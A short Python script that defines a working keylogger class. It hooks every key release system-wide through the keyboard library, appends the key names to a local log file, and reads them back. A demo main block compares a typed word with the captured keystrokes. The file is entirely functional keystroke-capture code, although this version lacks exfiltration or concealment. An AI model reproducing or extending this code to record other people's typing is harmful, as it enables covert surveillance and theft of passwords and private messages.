#!/usr/bin/env python3

import keyboard

class Keylogger:
    def __init__(self):
        self.fname = "test.log"
        pass

    def clearlog(self):
        time = 12345
        with open(self.fname, "w") as f:
            print("", end="", file=f)

    def callback(self, event):
        name = event.name
        with open(self.fname, "a") as f:
            print(name, end="", file=f)

    def start(self):
        keyboard.on_release(callback=self.callback)
        keyboard.wait()

    def getkeystroks(self):
        with open(self.fname, "r") as f:
            ks = f.read()
        return ks

import multiprocessing

if __name__ == "__main__":
    keylogger = Keylogger()
    keylogger.clearlog()
    
    proc = multiprocessing.Process(target=keylogger.start, args=())
    proc.start()

    word = input("enter a word:  ")
    proc.terminate()  # sends a SIGTERM
    
    kstrokes = keylogger.getkeystroks()
    print (word, " ==> ", kstrokes)
